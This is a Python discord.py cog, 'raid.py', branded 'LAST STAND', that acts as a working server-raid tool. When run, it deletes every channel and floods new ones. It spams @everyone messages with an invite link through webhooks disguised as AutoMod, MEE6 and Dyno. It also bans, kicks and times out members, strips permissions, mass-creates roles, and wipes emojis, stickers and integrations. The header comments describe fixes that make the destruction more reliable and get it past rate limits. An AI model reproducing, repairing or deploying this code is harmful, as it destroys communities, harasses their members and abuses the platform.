"""
raid.py — LAST STAND | Maximum Destruction Engine

ROOT CAUSE OF "only deletes, does nothing after":
  bypass.execute() swallows 403/404/400 silently (returns None).
  _phase_channel_loop only caught CancelledError — any other crash
  killed the loop with zero trace. All subsequent creates returned None,
  flood_created stayed 0, loop spun but created nothing.

FIXES:
  1. Channel creation uses DIRECT discord.py calls (no bypass engine).
     RateLimited is caught and retried explicitly. All errors logged to stdout.
  2. `except Exception` catches everything — loop never dies silently.
  3. print() on every error so Railway logs show exactly what's failing.
  4. Creates 2 channels per tick (fills Discord's ~2/sec guild bucket).
  5. Member ops chunk in background while channel flood is already running.
  6. Webhook spam uses direct calls, continuous loop, no batch limit.
"""

import asyncio
import datetime
import random
import string

import discord
from discord import app_commands
from discord.ext import commands

from utils.bypass import (
    ROUTE_CHANNEL_DELETE,
    ROUTE_MEMBER_BAN, ROUTE_MEMBER_KICK, ROUTE_MEMBER_TIMEOUT,
    ROUTE_WEBHOOK_CREATE, ROUTE_WEBHOOK_SEND,
    ROUTE_ROLE_CREATE, ROUTE_ROLE_ASSIGN,
    ROUTE_GUILD_EDIT,
    ROUTE_INTEGRATION,
)
from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG   = "LAST STAND"
RAID_SHORT = "LSC"
RAID_LINK  = "https://discord.gg/s59zWvzK6c"
RAID_NAME  = f"RAIDED BY {RAID_TAG}"

# ── Limits ─────────────────────────────────────────────────────────────────────
CHANNEL_CAP  = 480   # Discord allows 500; keep headroom
WEBHOOKS_PER = 10    # webhooks per flood channel
ROLE_CAP     = 240   # Discord allows 250
CH_DELAY     = 0.55  # seconds between channel-create ticks

# ── Concurrency semaphores ─────────────────────────────────────────────────────
SEM_BAN     = 25
SEM_KICK    = 25
SEM_TIMEOUT = 25
SEM_NICK    = 25
SEM_ROLE    = 10
SEM_DEL     = 40

# ── Message pool ───────────────────────────────────────────────────────────────
_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY LAST STAND 🔥 {RAID_LINK}",
    f"@everyone RAIDED BY LAST STAND — your defences failed. {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 🚨 BREACH — LAST STAND {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@everyone ⚡ RAIDED BY LAST STAND — GG {RAID_LINK}",
    f"@everyone 🛡️ YOUR ANTI-RAID FAILED — LAST STAND {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here 🏴 LAST STAND — SERVER CAPTURED {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
    f"@here 🔥 RAIDED BY LAST STAND — JOIN US {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod", "Security Alert",
    "System Notification", "Verification System", "Carl-bot", "MEE6",
    "Dyno", "Wick", f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Reaper",
    f"{RAID_SHORT} Ghost", f"{RAID_SHORT} Viper", f"{RAID_SHORT} Phantom",
]

_NICKS = [
    RAID_TAG, f"{RAID_SHORT} Raider", "RAIDED", "Server Owned",
    "GG no re", "LSC Was Here", "PWNED", "Raided",
]

_OWN_APP_ID = 1501093556037615726


def _rand(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _msg() -> str:
    return random.choice(_MSGS)


def _ch_name() -> str:
    return random.choice([
        f"raided-by-lsc-{_rand(4)}",
        f"last-stand-{_rand(4)}",
        f"lsc-owned-{_rand(4)}",
        f"lsc-raid-{_rand(4)}",
        f"raided-{_rand(4)}-lsc",
        f"last-stand-was-here-{_rand(3)}",
    ])


def _role_name() -> str:
    return random.choice([
        f"LSC-{_rand(4)}", f"lsc-{_rand(5)}", f"raid-{_rand(4)}",
        f"member-{_rand(4)}", f"{_rand(3)}-raider",
    ])


# ─────────────────────────────────────────────────────────────────────────────
class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── Shared launch ──────────────────────────────────────────────────────────
    async def _launch(
        self,
        guild: discord.Guild,
        invoker_id: int,
        reply,
    ) -> None:
        if bot_state.active_simulation:
            await reply(
                f"⚠️ **{bot_state.active_simulation}** already running — "
                f"use `/stop` or `.stop` first."
            )
            return

        try:
            bot_state.reset()
            bot_state.bypass.configure(10)
            bot_state.rate_controller.set_intensity(10)
            bot_state.active_simulation = "raid"

            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"Deleting channels → flooding → banning/kicking → webhook spam\n"
                f"Use `/stop` or `.stop` to halt."
            )

            # Channel + server ops start IMMEDIATELY — no chunk needed
            for coro in (
                self._phase_server(guild),
                self._phase_channel_loop(guild),
                self._phase_emoji_wipe(guild),
                self._phase_sticker_wipe(guild),
                self._phase_integration_wipe(guild),
            ):
                bot_state.add_task(asyncio.create_task(coro))

            # Member ops chunk in background — fires concurrently with channel flood
            bot_state.add_task(asyncio.create_task(
                self._phase_member_ops(guild, invoker_id)
            ))

        except Exception as exc:
            print(f"[raid] _launch crashed: {exc}", flush=True)
            bot_state.active_simulation = None
            try:
                await reply(f"❌ Launch failed: `{exc}`")
            except Exception:
                pass

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ MAXIMUM DESTRUCTION — {RAID_TAG}. Runs until /stop.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(
            guild=interaction.guild,
            invoker_id=interaction.user.id,
            reply=interaction.followup.send,
        )

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await self._launch(
            guild=ctx.guild,
            invoker_id=ctx.author.id,
            reply=ctx.send,
        )

    # ─────────────────────────────────────────────────────────────────────────
    # CHANNEL FLOOD LOOP
    #
    # Uses DIRECT discord.py calls — NOT the bypass engine.
    # bypass.execute() was swallowing errors silently (returns None on 403/404).
    # Here we catch every exception explicitly and print to Railway logs.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_channel_loop(self, guild: discord.Guild) -> None:
        se = bot_state.stop_event
        print(f"[raid] channel_loop starting in {guild.id}", flush=True)

        try:
            # ── Step 1: delete every existing channel ─────────────────────────
            existing = list(guild.channels)
            print(f"[raid] deleting {len(existing)} existing channels", flush=True)

            sem_del = asyncio.Semaphore(SEM_DEL)

            async def _del(ch: discord.abc.GuildChannel) -> None:
                async with sem_del:
                    try:
                        await ch.delete()
                    except discord.NotFound:
                        pass
                    except discord.Forbidden:
                        print(f"[raid] 403 deleting #{ch.name} — check bot perms", flush=True)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            ra = float(getattr(e, "retry_after", 1.0))
                            await asyncio.sleep(ra)
                            try:
                                await ch.delete()
                            except Exception:
                                pass

            await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
            print("[raid] channel delete phase done — starting flood", flush=True)

            # ── Step 2: infinite create loop ──────────────────────────────────
            flood_created = 0
            consecutive_fails = 0

            async def _create_one() -> discord.TextChannel | None:
                try:
                    ch = await guild.create_text_channel(
                        _ch_name(),
                        topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                    )
                    return ch
                except discord.Forbidden:
                    print("[raid] 403 on channel create — bot may have lost permissions", flush=True)
                    return None
                except discord.HTTPException as e:
                    if e.status == 429:
                        ra = float(getattr(e, "retry_after", 1.0))
                        print(f"[raid] 429 channel create — sleeping {ra:.1f}s", flush=True)
                        await asyncio.sleep(ra + 0.1)
                    return None
                except Exception as e:
                    print(f"[raid] channel create error: {e}", flush=True)
                    return None

            while not se.is_set():
                # Near cap: purge some of our channels to make room
                if flood_created >= CHANNEL_CAP:
                    our = [
                        ch for ch in guild.channels
                        if any(k in ch.name for k in ("lsc", "last-stand", "raided"))
                    ]
                    if our:
                        to_del = our[:80]
                        await asyncio.gather(*[_del(ch) for ch in to_del], return_exceptions=True)
                        flood_created = max(0, flood_created - len(to_del))
                    else:
                        flood_created = 0
                    await asyncio.sleep(1.0)
                    continue

                # Create 2 channels simultaneously per tick
                ch1, ch2 = await asyncio.gather(_create_one(), _create_one())

                for ch in (ch1, ch2):
                    if isinstance(ch, discord.TextChannel):
                        flood_created += 1
                        consecutive_fails = 0
                        bot_state.add_task(asyncio.create_task(
                            self._spam_channel(ch)
                        ))
                    else:
                        consecutive_fails += 1

                # 20+ consecutive failures = lost permissions or rate-walled badly
                if consecutive_fails >= 20:
                    print(f"[raid] 20 consecutive create failures — waiting 5s", flush=True)
                    await asyncio.sleep(5.0)
                    consecutive_fails = 0
                else:
                    await asyncio.sleep(CH_DELAY)

            print("[raid] channel_loop stopped", flush=True)

        except asyncio.CancelledError:
            print("[raid] channel_loop cancelled", flush=True)
        except Exception as e:
            print(f"[raid] channel_loop CRASHED: {type(e).__name__}: {e}", flush=True)
        finally:
            if bot_state.active_simulation == "raid":
                bot_state.active_simulation = None

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM — one task per channel, runs forever until stop or 404
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel(self, channel: discord.TextChannel) -> None:
        se = bot_state.stop_event

        try:
            # Create webhooks
            webhooks: list[discord.Webhook] = []
            for _ in range(WEBHOOKS_PER):
                if se.is_set():
                    break
                try:
                    wh = await channel.create_webhook(name=random.choice(_WH_NAMES))
                    webhooks.append(wh)
                except discord.NotFound:
                    return
                except discord.Forbidden:
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        ra = float(getattr(e, "retry_after", 1.0))
                        await asyncio.sleep(ra)
                    continue
                except Exception:
                    continue

            if not webhooks:
                # Fallback: spam with the channel directly
                while not se.is_set():
                    try:
                        await channel.send(
                            _msg(),
                            allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                        )
                    except discord.NotFound:
                        return
                    except discord.Forbidden:
                        return
                    except discord.HTTPException as e:
                        if e.status == 429:
                            ra = float(getattr(e, "retry_after", 1.0))
                            await asyncio.sleep(ra)
                return

            # Continuous webhook spam — all webhooks fire simultaneously every tick
            wave = 0
            while not se.is_set():
                sends = [
                    wh.send(
                        _msg(),
                        username=random.choice(_WH_NAMES),
                        allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                    )
                    for wh in webhooks
                    for _ in range(20)
                ]
                results = await asyncio.gather(*sends, return_exceptions=True)

                # If every single send failed, channel is probably gone
                all_failed = all(isinstance(r, Exception) for r in results)
                if all_failed:
                    # Check if channel is 404/403 type failures
                    for r in results:
                        if isinstance(r, discord.NotFound):
                            return
                        if isinstance(r, discord.Forbidden):
                            return

                wave += 1
                # No sleep — go as fast as Discord allows

        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[raid] spam_channel crashed on #{channel.name}: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # SERVER TAKEOVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event
        try:
            await asyncio.gather(
                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(name=RAID_NAME), se),
                bp.execute(ROUTE_ROLE_ASSIGN, lambda: guild.default_role.edit(
                    permissions=discord.Permissions.none(),
                ), se),
                return_exceptions=True,
            )
        except Exception as e:
            print(f"[raid] phase_server error: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — chunk first (background), then ban/kick/timeout/nick/roles
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        try:
            print("[raid] member_ops: chunking...", flush=True)
            try:
                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
            except Exception as e:
                print(f"[raid] chunk failed/timeout: {e}", flush=True)

            if se.is_set():
                return

            me = guild.me
            targets = [
                m for m in guild.members
                if not m.bot
                and m.id != invoker_id
                and m.id != me.id
                and m.top_role < me.top_role
            ]
            other_bots = [
                m for m in guild.members
                if m.bot
                and m.id != me.id
                and m.top_role < me.top_role
            ]
            print(f"[raid] member_ops: {len(targets)} targets, {len(other_bots)} bots", flush=True)

            await asyncio.gather(
                self._phase_ban_kick(guild, targets, other_bots),
                self._phase_timeout(targets),
                self._phase_nickname(targets),
                self._phase_role_flood(guild),
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[raid] member_ops crashed: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # BAN + KICK
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_ban_kick(
        self,
        guild: discord.Guild,
        members: list[discord.Member],
        bots: list[discord.Member],
    ) -> None:
        if not members and not bots:
            return

        sem_ban  = asyncio.Semaphore(SEM_BAN)
        sem_kick = asyncio.Semaphore(SEM_KICK)
        se       = bot_state.stop_event

        try:
            if bots:
                await asyncio.gather(
                    *[self._kick_one(guild, m, sem_kick) for m in bots],
                    return_exceptions=True,
                )
            if se.is_set():
                return
            await asyncio.gather(
                *[self._kick_one(guild, m, sem_kick) for m in members],
                *[self._ban_one(guild, m, sem_ban) for m in members],
                return_exceptions=True,
            )
            print(f"[raid] ban/kick phase done for {len(members)} members", flush=True)
        except asyncio.CancelledError:
            pass

    async def _kick_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(m, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _ban_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # TIMEOUT
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        dur = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, dur, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # NICKNAME FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_NICK)
        try:
            await asyncio.gather(
                *[self._nick_one(m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _nick_one(self, m: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.edit(nick=random.choice(_NICKS))
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_role_flood(self, guild: discord.Guild) -> None:
        bp  = bot_state.bypass
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(SEM_ROLE)

        try:
            results = await asyncio.gather(
                *[self._create_role(guild, sem) for _ in range(ROLE_CAP)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]
            print(f"[raid] role_flood: created {len(created)} roles", flush=True)

            if se.is_set() or not created:
                return

            non_bots = [m for m in guild.members if not m.bot]
            assigns = []
            for m in non_bots:
                for r in created[:50]:
                    assigns.append(bp.execute(
                        ROUTE_ROLE_ASSIGN,
                        lambda mem=m, role=r: mem.add_roles(role),
                        se,
                    ))
            await asyncio.gather(*assigns, return_exceptions=True)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[raid] role_flood error: {e}", flush=True)

    async def _create_role(
        self, guild: discord.Guild, sem: asyncio.Semaphore
    ) -> discord.Role | None:
        async with sem:
            return await bot_state.bypass.execute(
                ROUTE_ROLE_CREATE,
                lambda: guild.create_role(
                    name=_role_name(),
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                    mentionable=True,
                ),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI + STICKER WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_emoji_wipe(self, guild: discord.Guild) -> None:
        if not guild.emojis:
            return
        sem = asyncio.Semaphore(SEM_DEL)
        try:
            await asyncio.gather(
                *[self._try_delete_emoji(e, sem) for e in guild.emojis],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _try_delete_emoji(self, emoji: discord.Emoji, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

    async def _phase_sticker_wipe(self, guild: discord.Guild) -> None:
        if not guild.stickers:
            return
        sem = asyncio.Semaphore(SEM_DEL)
        try:
            await asyncio.gather(
                *[self._try_delete_sticker(s, sem) for s in guild.stickers],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _try_delete_sticker(self, s: discord.GuildSticker, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await s.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # INTEGRATION WIPE — never deletes own bot integration
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
        try:
            integrations = await guild.integrations()
            my_app_id: int = self.bot.application_id or _OWN_APP_ID
            safe = [
                i for i in integrations
                if getattr(getattr(i, "application", None), "id", None) != my_app_id
                and getattr(i, "id", None) != my_app_id
            ]
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_INTEGRATION,
                    lambda i=intg: i.delete(reason=f"Raided by {RAID_TAG}"),
                    bot_state.stop_event,
                ) for intg in safe],
                return_exceptions=True,
            )
        except Exception as e:
            print(f"[raid] integration_wipe error: {e}", flush=True)

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
